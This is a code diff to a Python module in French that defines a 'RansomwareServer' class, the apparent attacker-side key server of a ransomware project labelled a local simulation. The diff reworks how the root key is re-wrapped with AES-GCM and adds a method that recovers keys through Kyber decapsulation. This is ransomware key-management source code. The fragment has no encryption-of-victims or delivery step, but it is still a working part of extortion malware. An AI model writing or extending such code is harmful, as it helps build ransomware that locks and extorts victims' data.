@@ -2,6 +2,7 @@
 Gère la génération des clés, le stockage et la communication avec le client
 """
 
+import base64
 from typing import Dict, Optional
 
 import config
@@ -115,7 +116,7 @@ class RansomwareServer:
 
         # Réencapsule RK avec new MK
         print("[SVR] Réencapsule RK")
-        wrapped_rk_ciphertext, wrapped_rk_nonce, wrapped_rk_tag = crypto_utils.wrap_key_aes_gcm(root_key, new_master_key)
+        wrapped_rk_with_tag, wrapped_rk_nonce = crypto_utils.wrap_key_aes_gcm(root_key, new_master_key)
 
         # Màj état serveur
         self.password = new_password
@@ -126,12 +127,35 @@ class RansomwareServer:
         print(f"[SVR] Nouveau mot de passe : {self.password}")
 
         return {
-            "wrapped_rk_ciphertext": wrapped_rk_ciphertext,
+            "wrapped_rk_ciphertext": wrapped_rk_with_tag,
             "wrapped_rk_nonce": wrapped_rk_nonce,
-            "wrapped_rk_tag": wrapped_rk_tag,
             "salt": new_salt,
             "argon2_params": new_argon2_params,
         }
+
+    def decrypt_file_key(self, root_key_data: Dict, kyber_ciphertext: bytes) -> bytes:
+        """
+        Déchiffre file_key ou folder_key encapsulée avec root_key.
+
+        Args:
+            root_key_data: Contenu fichier .root_key {ciphertext, nonce} 
+            kyber_ciphertext: Ciphertext Kyber pour root_key
+
+        Returns:
+            Clé déchiffrée
+        """
+        if not self.initialized or self.kyber_secret_key is None:
+            raise RuntimeError("[ERR] Le serveur n'est pas initialisé")
+
+        print("[SVR] Déchiffrement clé individuelle avec RK")
+
+        # Reconstruit root_key via Kyber
+        root_key = crypto_utils.kyber_decapsulate(self.kyber_secret_key, kyber_ciphertext)
+
+        # Désencapsule la clé avec root_key
+        wrapped = base64.b64decode(root_key_data["ciphertext"])
+        nonce = base64.b64decode(root_key_data["nonce"])
+        return crypto_utils.unwrap_key_aes_gcm(wrapped, root_key, nonce)
 
 
 # Instance globale du serveur (simulation locale)
